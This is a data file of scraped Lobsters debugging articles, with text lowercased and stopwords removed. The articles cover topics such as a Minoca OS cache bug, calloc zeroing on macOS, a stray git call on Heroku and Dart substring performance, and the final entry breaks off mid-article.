491,Lobsters,debugging,Debugging,simeji/jid: JSON incremental digger,https://github.com/simeji/jid,simejijid json incremental digger,jid jq suggestion auto completion demo installation homebrew mac pkg freebsd package management system simply use jid command http githubcomsimejijidreleases build usage quick start simple json example simple json demo section initial query demo curl rdap load json file keymaps option,jid json incremental digger simple tool drill json interactively using filtering query like jq suggestion auto completion tool provide comfortable json drill demo installation homebrew mac brew install jid pkg freebsd pkg install jid package management system jid install package management system o simply use jid command simply want use jid command please download binary http githubcomsimejijidreleases build go get u githubcomsimejijidcmdjid usage quick start simple json example please execute command echo aa bb aaa cccc c jid jid running dig json data incrementally enter bbaaa see following filter bbaaa press enter key output exit simple json json used demo section echo info date version user name simeji uri http githubcomsimeji id name uri http examplecomsimeji id name uri http id usercount jid initial query first argument jid initial query use json demo curl sample using rdap data curl http rdgafiliasinfordapdomainexampleinfo jid load json file jid filejson keymaps key description tab ctrl show available item choice ctrl w delete cursor start word ctrl u delete whole query ctrl f right arrow move cursor character right ctrl b left arrow move cursor character left ctrl first character filter ctrl e end filter ctrl j scroll json buffer line downwards ctrl k scroll json buffer line upwards ctrl g scroll json buffer bottom ctrl scroll json buffer top ctrl n scroll json buffer page ctrl p scroll json buffer page ctrl l change view mode whole json key object esc hide candidate box option option description first argument initial query h print help help print help version print version exit q output query mode jq monochrome output mode
492,Lobsters,debugging,Debugging,Cache COW — a debugging adventure on Minoca OS,https://blog.minocacorp.com/cache-cow-a-debugging-adventure-on-minoca-os-573a7bd0d5c9,cache cow debugging adventure minoca o,cache cow debugging adventure minoca o sharing copyonwrite story light dirty cow bug catching bug pandaboard spin forever dissecting crash ldr crash c code pop pc saved link register pop pc expected link register usbhub kernel kernel kernel kernel kernel look kernel kernel kernel kernel c code educated guess check mmucontroldefaultvalue hlrunsingleprocessor one last theory mmpcleancacheregion arcleanentirecache mmpinvalidateinstructioncacheregion arinvalidateinstructioncache mmhandlefault zeroing cache copyonwrite copy mmpcopypage,cache cow debugging adventure minoca ossharing copyonwrite story light dirty cow bugwhat follows story tracked particularly obscure bug early day minoca o goescatching bugin january texas instrument pandaboard arm platform supported occasionally failed bootback minoca nightly build process ran pc found side road based pandaboard went well minoca o would compile install natively built image second partition reboot partition run test new build rare morning street pc running test pandaboard hung without debugger attached much rebootgiven hang rarity simply attaching debugger pandaboard every night would take long reach diagnosis bug begged better way reproduced two solid fact first never hit case mean cache related cache coherent arm second hung reboot middle compiling o without enough detail craft targeted repro attaching debugger pandaboard sticking reboot loop seemed like good place startwhile creative solution worth shot gaining information bug voila fifteen minute action error code crashpagefault parameter crashed maybe culprit routine print message kecrashsystemex actually spin forever without debugger attached would manifested hang nightly buildsdissecting crashanalysis crash parameter indicated usb hub driver faulted attempting access null parameter executing instruction saved parameter kd u ldr crash blx ldr eeee blx ldr load address stored tempting investigate null conundrum staring face usbhubpremovedevice executing boot hub attached pandaboard internal could removed null dereference seem like real problem next step figure calling usbhubpremovedevicethe trap frame parameter store register context time crash best place find answer saved link register record return address executing function pointed address within usbhubdispatchstatechange inspecting c code routine nothing seemed amiss device removal valid state change operation assembly however told different kd u bl usbhub pop pc saved link ldr cmp bne usbhub mov mov bl usbhub pop pc expected link movs byte discrepancy saved link register expected link register call usbhubpremovedevice enough evidence crash simple case uninitialized pointer wanted confirmation link register correct attempt remove hub boot bogus luckily trap frame also save stack pointer time crashthe minoca debugger dp command used dump memory pointer pointer resolving address corresponding symbol stack snipped kd dp usbhub kernel kernel kernel kernel kernel look kernel kernel kernel bfbbbffc kernel presence iopquerychildren stack great indication link register correct usbhubpenumeratechildren actually got called processor ended usbhubpremovedevicea quick inspection enumerate child routine c code showed quite simple called two function returned far get answer go assembly againkd u usbhubpenumeratechildrenusbhub push lr add sp mov ldr blx mov ldr usbhub add ldr mov blx pop pc stack proved first instruction executed saved link register trap frame pushed stack along three value seen stack second instruction added byte stack pointer stored calculation stored matched value saved trap frame register enough evidence convince add instruction executedthen trail ran cold move load branch followed nothing stack trap frame confirmed execution branch seemed interesting jumped procedure linkage table plt usb hub driver add ip pc add ip ip ldr pc ip plt looked fine though plt entry calculates address corresponding global offset table got entry kernel image loader fill got entry address routine implemented another binary case got entry question stored address usbhubquerychildren routine branch instruction attempting execute second branch instruction usbhubpenumeratechildren jumped different plt entry corresponding got entry correctly pointed iocompleteirpthis really rock bottom either two routine executed even single instruction stack would told different storyeducated guess checkso take step back looking armonly crash driver code program counter line link register stack trace left around branch plt wanting sanity check let reboot loop run similar crash page fault bogus address similar dead end execution stack failed usb hub driverrecalling number one rule armonly crash next step try reproduce bug cache disabled given program counter going deep end pandaboard instruction cache seemed like good place start removed bit mmucontroldefaultvalue get set system control register sctlr rebuilt image fired reboot loop bug disappeared minoca memory manager image loader probably missing instruction cache invalidation loading driver code bug hit also hit branch predictor cache disabledunfortunately could try data cache disabled would painfully slow minoca o depends ldrex strex instruction require exclusive monitor pandaboard implement data cachewith caching test way second rule thumb tracing weird bug test single core multicore introduces interprocessor interrupt ipis shooting translation lookaside buffer tlb entry perhaps stale tlb entry causing problem ala rebuilding o hlrunsingleprocessor set true still reproduced bugother hypothesis began take form could interrupt handler incorrectly restoring preinterrupt context clobbering program counter would hit often code path something wrong usb hub driver plt disassembly looked correct nothing special usb hub driver whatever explanation could come never convincing number one rule cache relatedone last theorynot able boot minoca o data cache disabled still bugged disable maybe could aggressive cleaning decided make cache clean invalidate request operate entire cache one cache line modifying mmpcleancacheregion call arcleanentirecache mmpinvalidateinstructioncacheregion call arinvalidateinstructioncache put pandaboard reboot loop hour later returned crash reboot loop taking minute reproduce bug still rebooting hour cleaning invalidating entire cache time solution progress cache change relate usb hub driver executing abyss well driver text section ie executable code read disk data cache never flushed instruction execution engine would fetch execute whatever random byte sitting ramthere lot going last sentence let explain architecture implement separate data instruction cache normal read writes operate data cache instruction fetch read instruction cache cache miss filled ram instruction cache read data cache executable code modified change stored data cache change observed instruction fetch data cache flushed ram instruction cache invalidated remove stale entry quite make sense diagram could explain similar yet inconsistent outcome crash ram different byte time rarity time data cache got naturally flushed driver executed seemed plausible pandaboard sd driver used dma text section would never data cache unless image loader modified text section yet text relocation image dynamic section z armnoneminocareadelfexe usbhubdrvdynamic section offset contains entry tag type namevalue needed shared library kernel needed shared library usbcoredrv soname library soname usbhubdrv hash strtab symtab strsz byte syment byte pltgot pltrelsz byte pltrel rel jmprel null losing hope theory figured hurt make sure nothing modifying usb hub driver code driver text section consistently loading address put check mmhandlefault see system ever writefaulted address sure enough hit faulting address owned privately mapped image section backed first page usb hub driver trap frame indicated pspimmapimagesegment zeroing slack space image sectionscaches copyonwritefollowing write fault observed call mmpisolateimagesection allocate private page copy image section existing content private page performing copyonwrite unfamiliar necessity copyonwrite behavior let explain application often directly map file memory using mmap eliminate system call overhead io operation kernel love dole physical page application saving memory get tricky application writes virtual address directly map file write modify physical page shared application case answer kernel trap write attempt allocates new private page copy content shared page writing application go way application none wiserthis copyonwrite behavior even important come modifying driver shared physical page mapped driver image section actually borrowed page cache writes allowed operate shared page change would end hard disk remember system zeroing slack space driver bunch zero hitting disk would corrupted binary copyonwrite necessary expectedthat said wrong mmpcopypage caching content original physical address arrow copied data cache entry newly allocated physical address arrow cleaning cache arrow simple act zeroing slack space triggering copyonwrite dragging entire text section new physical page without data cache clean instruction cache filling cache line arrow whatever random byte new physical page processor glad execute odd thing like trying remove internal usb hub bootthings adding inserting code mmpcopypage put pandaboard reboot loop one last time crash bug fixed section flag imagesectionexecutable mmpsyncswappage processorblock swappage pagesize cache cow bug affectionately calling particularly memorable hard reproduce typically aim isolate bug targeted test application cache fickle sometimes trust gut remember number one rule armonly bug cache king
493,Lobsters,debugging,Debugging,Debugging with Humility,http://amir.rachum.com/blog/2016/12/18/debugging-with-humility/,debugging humility,debugging humility stage debugging six stage debugging ask hacker news rcoding rprogramming twitter facebook ram rachum shachar ohana similar post,debugging humilitydecember university working software engineering student intel given point real software engineer responsible adult happened lucky work several engineer got experience different approach programming one engineer something remember day often needed help solve one bug another ask come take look getting weird compilation would say would gladly come help would start explain trying add import boost library may would cut gesture toward keyboard asking could take nod agree continue tried adding library gcc could find header give minute okay would cut againafter minute would without fail find bug even though helped help feel angry listen care hear attempt fixing bug fast forward five year working different place leading small team building web application one programmer team called consult bug showed code started explain behavior encountered sounded pretty simple pretty sure could solve could zoom around code freely minute two may said started laughing said say know mean business many programmer familiar consciously stage debugging six stage debuggingthat happenthat happen machinethat happenwhy happening oh seehow ever work think interesting transition third fourth stage first three stage mixture denial self delusion transition understanding one assumption wrong acceptance battle reality thought reality winswhy ignore teammate perpetuate behavior made mad senior engineer directed realization often caught surprise tried understand internal motivation causing behave way came conclusion helping someone first three stage guarantee lie intentionally course one assumption false feel easier see problem firsthand perhaps lacking falsehood preventing figuring wrongignoring person completely obviously correct way handle situation fortunately realizing problem first step quitting help others try explicit suspicion claiming happen obviously want try reproduce bug make sure one assumption covering problem course action reveals bug great put head together try understand wrong assumption sharingmore importantly whenever ask help day try consciously aware infect person get see behavior even try minimize perceived correctness previous effort solve bug try phrase nonconclusive way tried adding library gcc seem work may done wrong think right direction try think problem version compatibility sure phrasing way allows person easily question assumption method generally lead move happen happening discus post hacker news rcoding rprogramming comment section follow twitter facebook thanks hannan aharonov ram rachum shachar ohana reading draft similar post
495,Lobsters,debugging,Debugging,Logs and Metrics and Graphs,https://blog.raintank.io/logs-and-metrics-and-graphs-oh-my/,log metric graph,,
496,Lobsters,debugging,Debugging,Debugging Your Operating System: A Lesson In Memory Allocation,https://lukasa.co.uk/2016/12/Debugging_Your_Operating_System/,debugging operating system lesson memory allocation,hacker news decision censor call political content accept discomfort come confronting possible harm world order ensure leave world better found model view culture risk rise fascism bug report real bug memory actively zeroed mallocs callocs vmallocs oh let go calloc virtual memory back bug go source diving apple open source webpage abstraction leaky radar edit,edit hello hacker news good see want take away fun reading post digging memory management joy finding every little mistake made feel obliged remind great focus technical esoterica get really fun write software vacuum addition seeking technical content educates edifies hope also strongly encourage seek writing educates challenge political topic software developer uniquely privileged forefront revolutionising society next decade incumbent upon u informed nuanced role work play society whole end encourage challenge hacker news decision censor call political content understand moderating content difficult believe need accept discomfort come confronting possible harm world order ensure leave world better found part encourage consider whether ethical obligation involved building best world whether involves actively engaging disagree please also consider supporting publication produce longform work provides alternative valuable viewpoint need starting point consider model view culture local best source investigative journalism also strongly recommend consider whether risk rise fascism europe united state requires action part ensure employer community contribute repeat horror mid twentieth century lighthearted reminder way return regularly scheduled content enjoy post began many investigation bug report name bug report simple enough itercontent slow large chunk size http connection kind name bug report immediately fire alarm bell head two reason firstly remarkably difficult quantify slow mean slow large large secondly kind thing seems like effect severe heard itercontent method long time surely meaningfully slower reasonably common use mode heard quickly leaping initial report original reporter provides relatively little detail say cause cpu slows throughput le catch eye seems like possibly true idea merely downloading data minimal processing could slow surely however bug deserve investigation ruled backandforth original poster got reproduction scenario used request pyopenssl ran following code pin cpu find data throughput dropped extremely minimal amount import request http requestsget http streamtrue content httpsitercontent pas great repro scenario point finger clearly request stack usersupplied code running code shipped part request library one dependency risk user wrote wacky lowperformance code really fantastic even fantastic repro scenario us public url mean run reproduced bug every time one bit tantalising detail noticeable increase cpu load impact throughput cpu load like throughput reduced compared really interesting data point implies literal value chunk size affecting work load combine information fact occurs pyopenssl fact stack spends time following line code problem becomes clear file line recv buf ffinew char bufsiz investigation determined cffi default behaviour ffinew return zeroed memory meant linear overhead allocation size bigger allocation spend time zeroing data hence bad behaviour large allocation used cffi feature disable zeroing memory buffer problem went away problem solved right wrong real bug joking aside genuinely resolve problem however day later nathaniel smith asked insightful question memory actively zeroed understand question need digress bit memory allocation posix system mallocs callocs vmallocs oh many programmer familiar standard way ask operating system memory mechanism using c standard library function malloc read documentation system typing man malloc manual page function take single argument number byte allocate memory c standard library use one many different strategy allocating memory one way another return pointer bit memory least large amount memory asked standard malloc return uninitialized memory mean c standard library locates memory immediately pass program without changing already mean standard use malloc return buffer program program already written data behaviour common source nasty bug language memoryunsafe like c general reading uninitialized memory extremely dangerous pattern however malloc friend documented right alongside manual page calloc calloc obvious difference malloc take two argument count size malloc ask c standard library please allocate least n byte whereas call calloc ask c standard library please allocate enough memory n object size byte clear original intent calloc allocate heap memory array object safe way calloc extra side effect related original purpose allocate array mentioned quietly manual page allocated memory filled byte value zero go handinhand calloc original purpose example allocating array value often helpful array begin default state modern memorysafe language actually adopted default behaviour building array structure example go programming language initialize structure member defaulted socalled zero value basically equivalent value would everything set zero thought promise go structure allocated using calloc behaviour mean malloc return uninitialized memory calloc return initialized memory strict promise operating system optimise indeed modern operating system optimised let go calloc course simplest way implement calloc write like void calloc sizet count sizet size assert multiplicationwouldoverflow count size sizet allocationsize count size void allocation malloc allocationsize memset allocation allocationsize return allocation cost function like clearly approximately linear size allocation setting byte zero clearly going become increasingly expensive byte fact operating system ship c standard library optimised path memset usually taking advantage specialised cpu vector instruction zero lot byte instruction nevertheless cost linear operating system another trick sleeve larger allocation take advantage virtual memory trick virtual memory fully explaining virtual memory going beyond scope blog post unfortunately highly recommend read interesting stuff however short version virtual memory operating system kernel lie process memory process running machine view memory belongs alone view memory mapped onto physical memory indirectly allows operating system perform kind clever trickery one common form clever trickery bit memory actually file used swapping memory disk also used memorymapping file case memory mapping file program ask operating system please allocate n byte memory back bit memory file disk write memory writes written file disk read memory read come file disk way work kernel level process try read memory cpu notice memory process reading actually exist pause process emit page fault operating system kernel invoked act bring data memory application read original process unpaused find perspective time passed magically byte file present memory location mechanism used perform neat trick one make large memory allocation free properly make expensive proportion much memory used rather proportion much memory allocated reason historically many program needed decent chunk memory lifetime would startup allocate massive buffer byte could parcel internally program lifetime done program written environment use virtual memory needed call dibs certain amount memory avoid getting starved virtual memory policy longer needed program allocate much memory need ondemand longer starve help avoid application large startup cost operating system started lie large allocation operating system attempt allocate kilobyte one call c standard library ask operating system directly brandnew virtual memory page cover many byte key cost almost nothing operating system actually allocate commit memory point set virtual memory mapping make operation extremely cheap time malloc call course memory mapped process moment application try actually use memory page fault occur point operating system find actual page memory put place much like page fault memorymapped file except virtual memory backed physical memory instead file net result modern operating system call malloc allocate one gigabyte memory happen almost immediately actually nothing done truly give process memory result program allocates many gigabyte memory never actually us execute quite quickly long allocation quite large potentially surprising optimisation made calloc work operating system map brand new page socalled zero page page memory readonly read entirely zero mapping initially copyonwrite mean process eventually try write brand new memory map kernel intervene copy zero new page apply write o trick calloc larger allocation simply malloc ask brandnew virtual memory page continues cost memory actually used neat optimisation mean calloc cost exactly malloc size despite calloc additional promise zeroing memory neat back bug nathaniel pointed cffi using calloc would memory zeroed part one course always use calloc suspicion bumped case could reproduce slowdown directly calloc went back coded quick repro program came include stdlibh define allocationsize int main int argc char argv int void temp calloc allocationsize free temp return simple c program allocates free memory using calloc ten thousand time exit two likely possibility might happen calloc may use virtual memory trick described case expect program fast indeed memory allocate never actually get used never get paged page never get dirtied o little trick lying u allocating memory never call o bluff everything work beautifully calloc may use malloc zero memory manually using memset expect slow total need zero one terabyte memory ten thousand increment mb take quite lot effort well standard o threshold using behaviour expect behaviour indeed linux exactly see compile gcc run find executes quickly indeed cause page fault exerts little memory pressure take program run macos find take extremely long time testing took nearly eight minute even weirdly make allocationsize bigger say suddenly macos program becomes almost instantaneous hell happening go source diving macos contains neat utility called sample see man sample tell quite lot running process sampling process state sample output program looked like sampling process second millisecond run time sample sampling completed processing symbol sample analysis process written file analysis sampling aout pid every millisecond process aout path userscorytmpaout load address identifier aout version code type parent process zsh datetime launch time o version mac o x report version analysis tool usrbinsample call graph comapplemainthread serial start libdylddylib main aout calloc libsystemmallocdylib malloczonecalloc libsystemmallocdylib szonemallocshouldclear libsystemmallocdylib largemalloc libsystemmallocdylib platformbzero variant haswel libsystemplatformdylib largemalloc libsystemmallocdylib madvise libsystemkerneldylib main aout freelarge libsystemmallocdylib madvise libsystemkerneldylib freelarge libsystemmallocdylib madvise libsystemkerneldylib main aout total number stack recursive counted multiple sort top stack collapsed platformbzero variant haswell libsystemplatformdylib madvise libsystemkerneldylib key note clearly see spending bulk time platformbzero variant haswell method used zero buffer mean macos zeroing buffer well handily apple opensources much core operating system code sometime release see program spends time libsystemmalloc simply went apple open source webpage downloaded tarball contains relevant source code went spelunking turn magic happens largemalloc branch used allocation larger ultimately use virtual memory trick really slow execution well turn apple got bit clever good largemalloc contains whole bunch code hidden behind define constant configlargecache whole bunch code basically amount freelist large memory page allocated program macos program allocates contiguous buffer memory largecachesizeentrylimit approximately libsystemmalloc attempt reuse page another allocation made could use save needing ask darwin kernel memory page save context switch syscall nontrivial saving principle however calloc naturally case need byte zeroed reason macos find page reused called calloc zero memory every time totally unreasonable zeroed page legitimately limited resource especially resource constrained hardware looking apple watch mean possible reuse page potentially really major saving however page cache totally destroys optimisation using calloc provide zeroed memory page bad done dirty page page zeroing written application likely zeroed macos unconditionally mean call calloc free calloc without ever touching memory second call calloc take page allocated first one never backed actual memory force o page memory order zero even though already zeroed part trying avoid virtualmemory based allocator large allocation memory ever used becomes used freelist net effect macos calloc cost linear allocation size way despite fact operating system get behaviour mb macos stop caching page sudden everything get speedy great really unexpected bug find python program raise number question example many cpu cycle wasted zeroing memory already zeroed many context switch wasted forcing application pagein memory never used need o could unnecessarily zero ultimately though think show truth old adage abstraction leaky python programmer mean able forget somewhere depth running machine built memory trickery someday program going really unexpectedly slow way find dive way operating system work silly thing memory bug filed radar handsdown one weirdest bug ever encountered edit previous version post talked operating system kernel zeroing page idle time really way work modern os instead copyonwrite version zeropage used another neat optimisation allows kernel avoid spending lot time writing zero used page instead write zero application actually writes data page effect saving even cpu cycle application asks memory literally never touch never cost anything fill zero neat
497,Lobsters,debugging,Debugging,How the Circle Line rogue train was caught with data,https://blog.data.gov.sg/how-we-caught-the-circle-line-rogue-train-with-data-79405c86ab6a,circle line rogue train caught data,signal interference move tunnel could something dataset caused incident could cause interference train opposite track figure could train moving opposite direction snippet snippet disjointset data structure snippet snippet snippet emergency braking incident dataset case could explained rogue train hypothesis figure incident clustered algorithm,signal interference move tunnel point still clear single train culpritwhat established seemed pattern time location incident happening one another opposite direction previous incident seemed almost like trail destruction could something dataset caused incident indeed imaginary line connecting incident looked suspiciously similar marey chart screenshot could cause interference train opposite track figure could train moving opposite direction decided test rogue train hypothesiswe knew travel time station along circle line range two four minute mean could group emergency braking incident together occur four minute apartsnippet found incident pair satisfied condition snippet grouped related pair incident larger set using disjointset data structure allowed u group incident could linked rogue train snippet applied algorithm data snippet cluster identified next calculated percentage incident could explained clustering algorithmsnippet result mean emergency braking incident dataset case could explained rogue train hypothesis felt right trackwe coloured incident chart based clustering result triangle colour clusterfigure incident clustered algorithm
498,Lobsters,debugging,Debugging,Avoid these Things When Logging from Your Application,https://blog.logentries.com/2016/09/avoid-these-things-when-logging-from-your-application/,avoid thing logging application,forgetting context cryptic code spamming log file unsafe logging call mixing application logic logging single responsibility principle sensible logging free logentries account,seems almost strange talk avoiding thing logging logging last line defense salvation many case crazy bug field show every third full moon external auditor looking app runtime behavior logging rescue naturally stand reason would want log everything application whenever doubt slam logger call let log level sort detail always filter log magic stuff fact talk avoidance well turn logging may highly inclusive activity term included way create problem want liberal term log judicious wise term log want indulge feckless freeforall come call make application logger problem avoid let take look thing come back bite forgetting context want avoid hated someone future debugging log file avoid forgetting context message arrive perhaps instead saying message arrived state message well see mean consider code public void processfile try fetcherfetchfile catch invalidfiletypeexception ifte loggerlog invalid file type collaborator field called fetcher tasked fetching file code anticipates action could result file type invalid happens informs user file type invalid really go extra mile log exception absent least inspect see offending file type try put position person reading message ask might thinking oh see invalid file type pretty much certainty going ask file type proved invalid supply context cryptic code another source log file woe related lack context perhaps even specific case sort mystery code log entry imagine perusing log file finding error reading file error absolute best case scenario maintenance programmer encyclopedic knowledge application error code luck say oh happens process file us deprecated pipedelimited format next best scenario lot le rosy hunt source code documentation error code mean worst would search dead ending magic number code point information log basically useless going log code fine also log along mean way exception logged alongside explanatory message spamming log file ever seen string identical entry inside file provided valuable insight possible application spam log file recording sequence vacuous entry rather obvious example consider revamped version file fetcher public configfile processfile fetchergetstatus filefetcherstatesready loggerlog waiting filefetcher ready state var file fetcherfetchfile loggerlog file filename successfully fetched return file could quite possibly result ten thousand line waiting filefetcher ready state differing timestamp really valuable use application logging best provides statistic performance getstatus call le delugeinducing option could simply keep track started polling stopped many time happened recording information context code bear mind log file look like logging tight loop going bury maintenance folk quasiuseless information would serve better digest form unsafe logging call take look code last example see notice anything else amiss something look fishy second call logger happens fetcherfetchfile return null aside logger call method would would return null value second logging call mix method throw null reference exception good general rule thumb logging extremely safe far application code go logging important tends mission critical want affect actual runtime behavior want best bear quiet witness everything happens avoid invoking logger way generate exception cause similar dependency mixing application logic logging seen various occasion might think one go without saying apparently say avoid logging implementation thing application need besides logging understand mean encountered situation people thought wrap standard homegrown logging implementation couple concern like aspect type file io perhaps egregious example recall homerolled logging implementation became handy repository global variable since universally acceptable implemented static needle say created hopelessly tangled mess logger actually critical application normal operation general good application architecture practice couple thing together unnecessarily single responsibility principle advises logging extremely unique application concern behaves like nothing else making particularly terrible candidate sort thing avoid logging implementation anything log sensible logging mentioned beginning post come logging want capturing much information state application arm maintenance programmer operation folk people reproducing error really interested party need make sure capturing information also need make sure sensible way start capturing analyzing log data today free logentries account
499,Lobsters,debugging,Debugging,Who Called Git? An Unusual Debugging Story,http://schneems.com/2016/11/28/who-called-git-an-unusual-debugging-story/,called git unusual debugging story,issue bug hunt trick raven gem fixed recent version raven thought rubygemsorg nate following schneems twitter new article inbox,usually talk support ticket work ticket specific hard write generalized article get type ticket worth blogging usually find better place write like devcenter doc look way push fix upstream open source library today got unusual bug fixed fairly unusual way thought might interested issue customer complaining output coming would run command heroku run rail console fatal git repository parent mount point app stopping filesystem boundary gitdiscoveryacrossfilesystem set originally thought issue may coming heroku cli since issue happening locally btw know open shell session heroku using heroku run bash telling people year still surprising useful debugging anyway little investigation turn get output time run app command server heroku run bash rake asset precompile fatal git repository parent mount point app stopping filesystem boundary gitdiscoveryacrossfilesystem set problem traumatic annoying also best practice run warning possible unrelated support ticket customer mine getting warning told exactly fix problem notice regularly getting warning deploy new one added see take action bug hunt customer gave application access able reproduce issue pretty easily error output would get try run git command git repo cd tmp git checkout foo fatal git repository parent directory git know message came quick google would point git source error happening heroku one way make scaling fast package app zipped file roughly get run put dyno unpack one limiting factor fast transfer zipped file call slug recommend keeping size repo low help strip git directory app since add extra disk space make scaling restarting migrating dyno type slower error git telling u trying run git command git repository make sense since strip git directory know issue happening git repo dyno plus running git command know issue happening ie triggering git code first instinct grep app git call grep r git app config lib got hit mostly di git string smoking gun expanding search directory gave way many hit reference string git exact would take long go get bit specific assume shelling searching git however still entry still quite bit trick specific problem common general type problem one program call another one usually want know first program second called perfect world would able raise exception second program get backtrace first however always work case call git erroring returning nonzero exit code however parent program ignoring option attempt get information figured maybe could find argument passed git could better find problem wrote executable bingit since bin first path o pick orignial git command heroku run bash cat eot bingit usrbinenv ruby raise argvinspect eot alarmed modifying production code heroku run instance spin new dyno connected running app whatever want instance disk effect production website also make sure executable see command preferred git appbingit run command app get new error output main revparse short head runtimeerror give u information output mean git called git revparse short head quick grep give u one one match grep r git revparse short gemsravenrubylibravenconfigurationrb selfrelease git revparse short head strip rescue nil comming raven gem sentry client trying determine sha latest release report sentry server checking see git folder present first error message coming turn already fixed recent version raven check added customer upgraded recent version raven error went away thought writing custom executable output debugging info common technique likely never use wanted write interesting case maybe better way find info one worked fine always go deep dive customer issue get ton similar error report find issue intriguing enough sometimes dig sometimes fun one debugging technique use time would potentially solved issue update gem people run really old dependency usually recommend related culprit example rake asset precompile failing suggest upgrading gem sprocket asset name often bug fixed larger community take advantage fix unless upgrade version fix smoking gun problem coming run bundle outdated example command run rubygemsorg repo bundle outdated fetching gem metadata http rubygemsorg fetching version metadata http rubygemsorg fetching dependency metadata http rubygemsorg resolving dependency outdated gem included bundle psych newest installed requested group default rack newest installed group default rail newest installed requested group default actionmailer newest installed actionpack newest installed actionview newest installed activejob newest installed activemodel newest installed activerecord newest installed activesupport newest installed arel newest installed railsdomtesting newest installed railties newest installed thanks nate reminding command rubyconf also coincidentally happens person made fix sentry client liked consider following schneems twitter signing get new article inbox email week roll
500,Lobsters,debugging,Debugging,Adventures in the land of substrings and RegExps,http://mrale.ph/blog/2016/11/23/making-less-dart-faster.html,adventure land substring regexps,part little substring could low performance cpu profile observatory carl friedrich gauss source code implementing substring operation codestubassembler substring issue blog post issue memory leak eventually removed removed added back original dart sdk bug part ii enter exactly code regexp flag lex lexx regexp engine irregexp erik corry ported dart vm found fixed fix part iii trap regexps,part little substring could week ago bug filed dart sdk citing low performance stringsubstring core microbenchmark developer submitted together issue javascript version function test consoletime substring j slength ssubstring consoletimeend substring j dart version test final stopwatch new stopwatch start slength ssubstring print substring dart stopwatchelapsedmilliseconds m result rather bad dart version dart substringdart benchmarking string length substring dart benchmarking string length substring dart benchmarking string length substring dart node substringjs benchmarking string length substring j benchmarking string length substring j benchmarking string length substring j depending background might also surprised nonlinear growth dart run time increasing input string size factor increase running time factor millisecond running benchmark dart observe looking cpu profile observatory reveals unsuprising picture time spent substring operation dart vm substring much slower must implemented completely differently indeed dart vm implement stringsubstring start end straightforward manner allocates new string object length end start copy string content new string formally speaking n implementation also known linear time requires amount operation proportional length substring take look core benchmark become obvious running time exhibit quadratic growth slength ssubstring assuming initial length string n first iteration loop creates substring length n next iteration creates substring length n last iteration creates substring length mean loop requires operation proportional never encountered sequence suggest stop think bit formula sum derived solution simplicity elegance might provide welcomed retreat fighting webpack configs prince mathematics carl friedrich gauss managed figure though obviously would never know would facing modern javascript ecosystem complexity loop precisely reason good idea iterate string slicing away processed piece unless course runtime bit magic internally optimizes particular unsurprisingly take look source discover somewhat intimidating zoo different string representation optimizing particular use case indexing concatenation slicing string abstract class capture javascript string value string value string value member type string finite ordered sequence zero unsigned integer value string value length field class string public name seqstring abstract class capture sequential string value class seqstring public string onebytestring class capture sequential onebyte string object character onebytestring onebyte character class seqonebytestring public seqstring twobytestring class capture sequential unicode string object character twobytestring twobyte class seqtwobytestring public seqstring consstring class describes string value built using addition operator string consstring pair first second component pointer string value one component consstring pointer consstrings creating binary tree consstrings leaf nonconsstring string value string value represented consstring obtained concatenating leaf string value lefttoright depthfirst traversal tree class consstring public string sliced string class describes string substring another sequential string motivation save time memory creating substring sliced string described pointer parent offset start parent string length using sliced string therefore requires unpacking parent string adding offset start address substring sliced string nested since double indirection simplified creating substring currently missing feature handling externalized parent string external string parent truncating sliced string enable otherwise unneeded parent gced class slicedstring public string externalstring class describes string value backed string resource lie outside heap externalstrings consist length field common string pointer external resource important ensure externally resource deallocated externalstring live heap api expects externalstrings created api therefore externalstrings used internally class externalstring public string externalonebytestring class external string backed onebyte string class externalonebytestring public externalstring externaltwobytestring class external string backed encoded string class externaltwobytestring public externalstring whenever see string value javascript code actually backed representation runtime able operate interchangeably even go one representation another dynamically improves performance operation javascript runtimes similarly convoluted representation hierarchy spawned benchmark race desire optimize common usage pattern see spidermonkey stringh jsc jsstringh stringh file chakra source understanding difference different string representation used different j runtimes usually key understanding string manipulation code performs certain way example could digress discus function strange var var mathfloor slength return run time faster spidermonkey unfortunately beyond scope post let return back stringprototypesubstring microbenchmark question cutting layer c assembly would eventually arrive code implementing substring operation note cleaned version original code unimportant detail removed readablity handle string factory newpropersubstring handle string str int begin int end string consstring produced result concatenation flatten flat representation str string flatten str int length end begin length slicedstring kminlength resulting substring small simply allocate new sequential string fill character str isonebyterepresentation handle seqonebytestring result newrawonebytestring length tohandlechecked dest result getchars string writetoflat str dest begin end return result else handle seqtwobytestring result newrawtwobytestring length tohandlechecked dest result getchars string writetoflat str dest begin end return result resulting substring large enough warrant slicedstring allocation instead allocating sequential string copying substring character allocate slicedstring object contains pointer original string substring start offset substring length int offset begin input string slicedstring unwrap str isslicedstring handle slicedstring slice handle slicedstring cast str str slice parent offset slice offset create slice handle slicedstring slice new slicedstring slice sethashfield string kemptyhashfield slice setlength length slice setparent str slice setoffset offset return slice nothing ever implemented single place lost soul searching substring implementation might also find digging codestubassembler substring construct turbofan graph would compiled machine code serve substring stub essentially implement fast path c logic translating c logic dart would get something like class stringslice implement string final string parent final int offset final int length stringslice thisparent thisoffset thislength static substring str start end end null end strlength else end strlength throw range error end end greater string length strlength start start end throw range error start start range end final length end start str stringslice start stroffset str strparent return new stringslice str start length test final stopwatch new stopwatch start slength stringslicesubstring print substring dart stopwatchelapsedmilliseconds m dart substringdart benchmarking string length substring dart benchmarking string length substring dart benchmarking string length substring dart javascript version approximately explains observe quadratic complexity microbenchmark roughly speaking substring operation take constant amount time assuming input string flat disregarding memory management overhead thus instead get given drastic performance improvement would implement similar optimization dart vm well substring optimization come dangerous trap built lead surprising memory leak function process str var strsubstring return token var obj process counterintuitively obj retains whole input string instead small character token token internally represented slicedstring point back source string might seem like contrived example leak like tend happen real world threejs issue describing work around issue blog post somebody hunt leak production eagerness runtime fall make code faster clever hidden optimization ugly side issue track progress fixing side nothing really happened since probably simple robust solution remove sliced string altogether interestingly precisely java used implement stringsubstring time reusing parent string char storage substring object lead memory leak eventually removed history string slice even curious originally removed added back somewhat bad news original dart sdk bug prompted trip memory lane indeed dart vm unlikely implement substring optimization slicedstrings decided probe exactly measuring substring performance part ii enter lessdart turn bug prompted investigation slowness lessdart port lessjs javascript dart looking lessdart benchmark observatory reveals following picture le parser exactly would recommend iterating input string using substring operation looking source reveals following code reason using substring becomes obvious regexp reg int index currentpos current currentsubstring currentpos currentpos match regfirstmatch current null return null skipped code ported wordforword javascript exactly code exists javascript version ahm suboptimality hidden helpful javascript runtime author le decided parse input using regular expression instead writing custom lexer however world lexing regexps convoluted fact could take regular expression easily 